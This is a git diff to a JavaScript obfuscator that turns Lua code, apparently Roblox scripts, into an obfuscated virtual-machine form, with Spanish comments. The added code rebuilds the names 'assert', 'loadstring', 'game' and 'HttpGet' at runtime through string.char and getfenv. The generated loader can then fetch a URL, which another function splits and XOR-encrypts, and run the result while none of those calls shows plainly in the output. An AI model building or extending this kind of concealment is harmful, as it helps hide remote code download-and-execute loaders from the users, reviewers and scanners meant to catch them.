@@ -79,6 +79,11 @@ function applyCFF(blocks) {
   return lua
 }
 
+// NUEVO: Reconstrucción de strings en runtime para ocultar llamadas críticas
+function runtimeString(str) {
+  return `string.char(${str.split('').map(c => heavyMath(c.charCodeAt(0))).join(',')})`;
+}
+
 // TÉCNICA MIMOSA: URL dividida, envuelta y cifrada con XOR dinámico (llave mutante)
 function buildTrueVM(payloadStr) {
   const STACK = generateIlName()
@@ -112,10 +117,16 @@ function buildTrueVM(payloadStr) {
   
   vmCore += `local _e = table.concat(${STACK}) ${STACK}=nil `
   
+  // Aplicando desensamblado de loadstring y dependencias
+  const ASSERT = `getfenv()[${runtimeString("assert")}]`;
+  const LOADSTRING = `getfenv()[${runtimeString("loadstring")}]`;
+  const GAME = `getfenv()[${runtimeString("game")}]`;
+  const HTTPGET = runtimeString("HttpGet");
+  
   if (payloadStr.includes("http")) {
-    vmCore += `assert(loadstring(game:HttpGet(_e)))() `
+    vmCore += `${ASSERT}(${LOADSTRING}(${GAME}[${HTTPGET}](${GAME}, _e)))() `
   } else {
-    vmCore += `assert(loadstring(_e))() `
+    vmCore += `${ASSERT}(${LOADSTRING}(_e))() `
   }
   
   return vmCore
@@ -218,3 +229,4 @@ function obfuscate(sourceCode) {
 }
 
 module.exports = { obfuscate }
+  
